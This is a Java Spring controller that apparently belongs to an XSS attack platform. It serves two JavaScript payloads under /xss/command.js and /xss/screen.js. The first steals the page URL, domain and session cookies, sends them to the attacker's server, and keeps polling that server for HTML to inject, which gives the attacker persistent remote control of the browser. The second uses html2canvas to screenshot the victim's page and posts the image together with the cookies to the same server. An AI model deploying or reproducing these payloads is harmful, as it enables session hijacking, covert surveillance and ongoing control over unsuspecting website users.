package com.bin.kong.security.server.controller.xss;

import com.bin.kong.security.core.utils.IpUtils;
import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

@RestController
@Slf4j
public class XssJsTemplateController {
    /**
     * 动态获取command命令
     *
     * @param id
     * @return
     */
    @RequestMapping(value = "/xss/command.js")
    public String ajax_get_command_by_user_id(@RequestParam Integer id) {
        String Command_Template = "/**\n" +
                " * 请求地址 \\ cookie \\当前屏幕截图\\ 请求域名\n" +
                " */\n" +
                "let head = document.getElementsByTagName('head')[0]\n" +
                "let script_jquery = document.createElement('script')\n" +
                "let onload_is_null = false\n" +
                "\n" +
                "let xssInfo = {\n" +
                "  cookie: null,\n" +
                "  domain: null,\n" +
                "  url: null,\n" +
                "  user_id:" + id +
                "}\n" +
                "let timer\n" +
                "script_jquery.type = 'text/javascript'\n" +
                "\n" +
                "script_jquery.src = 'https://code.jquery.com/jquery-3.1.1.min.js'\n" +
                "\n" +
                "head.appendChild(script_jquery)\n" +
                "\n" +
                "script_jquery.onload = function () {\n" +
                "  if (window.onload == null) {\n" +
                "    onload_is_null = true\n" +
                "    setTimeout(ajax_xss, 1000)\n" +
                "  }\n" +
                "\n" +
                "  window.onload = function () {\n" +
                "    this.ajax_xss()\n" +
                "  }\n" +
                "}\n" +
                "\n" +
                "function ajax_xss () {\n" +
                "  try {\n" +
                "    xssInfo.url = escape(document.location.href)\n" +
                "  } catch (e) {\n" +
                "    console.log('获取url异常！')\n" +
                "    xssInfo.url = ''\n" +
                "  }\n" +
                "  try {\n" +
                "    xssInfo.cookie = escape(document.cookie)\n" +
                "  } catch (e) {\n" +
                "    console.log('获取cookie异常！')\n" +
                "    xssInfo.cookie = ''\n" +
                "  }\n" +
                "\n" +
                "  try {\n" +
                "    xssInfo.domain = escape(document.domain)\n" +
                "  } catch (e) {\n" +
                "    console.log('获取domain异常！')\n" +
                "    xssInfo.domain = ''\n" +
                "  }\n" +
                "  $.ajax({\n" +
                "    url: 'http://" + IpUtils.getLocalIp() + ":8080/api/xss/command',\n" +
                "    type: 'GET',\n" +
                "    dataType: 'jsonp',\n" +
                "    data: xssInfo,\n" +
                "    success: function (data) {\n" +
                "      // $('body').append(\"<script>alert(22222)</script>\")\n" +
                "      // console.log('JSONP_DATA:' + JSON.stringify(data))\n" +
                "\n" +
                "      if (timer == undefined) {\n" +
                "\n" +
                "        timer = window.setInterval(() => {\n" +
                "          let form = {\n" +
                "            id: data.data,\n" +
                "            user_id:" + id +
                "          }\n" +
                "          $.ajax({\n" +
                "            url: 'http://" + IpUtils.getLocalIp() + ":8080/api/xss/command',\n" +
                "            type: 'GET',\n" +
                "            dataType: 'jsonp',\n" +
                "            data: form,\n" +
                "            success: function (data) {\n" +
                "              $('body').append(data.data)\n" +
                "              // console.log('JSONP_DATA:' + JSON.stringify(data))\n" +
                "            }\n" +
                "          })\n" +
                "        }, onload_is_null ? 1000 : 2000)\n" +
                "      }\n" +
                "    }\n" +
                "  })\n" +
                "}\n" +
                "\n";
        return Command_Template;
    }

    /**
     * 动态获取screen模板
     *
     * @param id
     * @return
     */
    @RequestMapping(value = "/xss/screen.js")
    public String ajax_get_screen_by_user_id(@RequestParam Integer id) {
        String Screen_Template = "/**\n" +
                " * 请求地址 \\ cookie \\当前屏幕截图\\ 请求域名\n" +
                " */\n" +
                "\n" +
                "let head_screen = document.getElementsByTagName('head')[0]\n" +
                "let script_screen = document.createElement('script')\n" +
                "let xssInfo_screen = {\n" +
                "  img: null,\n" +
                "  cookie: null,\n" +
                "  domain: null,\n" +
                "  url: null,\n" +
                "  user_id:" + id +
                "}\n" +
                "script_screen.type = 'text/javascript'\n" +
                "script_screen.onload = script_screen.onreadystatechange = function () {\n" +
                "  if (window.onload == null) {\n" +
                "    setTimeout(ajax_xss, 1000)\n" +
                "  }\n" +
                "  window.onload = function () {\n" +
                "    this.ajax_xss()\n" +
                "  }\n" +
                "}\n" +
                "script_screen.src = 'https://xsspt.com/js/html2canvas.js'\n" +
                "head_screen.appendChild(script_screen)\n" +
                "\n" +
                "function ajax_xss () {\n" +
                "  html2canvas(document.body).then(canvas => {\n" +
                "\n" +
                "    try {\n" +
                "      xssInfo_screen.img = escape(canvas.toDataURL())\n" +
                "\n" +
                "    } catch (e) {\n" +
                "      console.log('截图异常！')\n" +
                "      xssInfo_screen.img = ''\n" +
                "    }\n" +
                "    try {\n" +
                "      xssInfo_screen.url = escape(document.location.href)\n" +
                "    } catch (e) {\n" +
                "      console.log('获取url异常！')\n" +
                "      xssInfo_screen.url = ''\n" +
                "    }\n" +
                "    try {\n" +
                "      xssInfo_screen.cookie = escape(document.cookie)\n" +
                "    } catch (e) {\n" +
                "      console.log('获取cookie异常！')\n" +
                "      xssInfo_screen.cookie = ''\n" +
                "    }\n" +
                "\n" +
                "    try {\n" +
                "      xssInfo_screen.domain = escape(document.domain)\n" +
                "    } catch (e) {\n" +
                "      console.log('获取domain异常！')\n" +
                "      xssInfo_screen.domain = ''\n" +
                "    }\n" +
                "\n" +
                "    let ajax = new XMLHttpRequest()\n" +
                "    ajax.open('POST', 'http://" + IpUtils.getLocalIp() + ":8080/api/xss/screen', true)\n" +
                "    ajax.setRequestHeader('Content-type', 'application/x-www-form-urlencoded')\n" +
                "    ajax.send(JSON.stringify(xssInfo_screen))\n" +
                "    ajax.onreadystatechange = function () {\n" +
                "      if (ajax.readyState == 4 && ajax.status == 200) {\n" +
                "        console.log('执行结果：' + ajax.responseText)\n" +
                "      }\n" +
                "    }\n" +
                "  })\n" +
                "}\n";
        return Screen_Template;
    }

}
